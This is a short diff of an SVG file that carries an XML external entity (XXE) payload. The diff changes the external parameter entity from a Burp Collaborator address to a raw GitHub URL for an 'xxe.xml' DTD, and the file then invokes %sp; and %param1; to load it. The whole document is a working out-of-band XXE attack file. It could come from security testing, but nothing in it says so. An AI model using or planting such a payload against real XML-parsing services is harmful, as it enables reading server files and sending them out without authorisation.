@@ -1,7 +1,7 @@
 <?xml version="1.0" standalone="yes"?>
 <!DOCTYPE svg [
 <!ELEMENT svg ANY >
-<!ENTITY % sp SYSTEM "http://l2onvw6r24v6mu4g1xrk7pazvq1gp5.burpcollaborator.net">
+<!ENTITY % sp SYSTEM "https://raw.githubusercontent.com/YakinAnd/testRep/main/xxe.xml">
 %sp;
 %param1;
 ]>
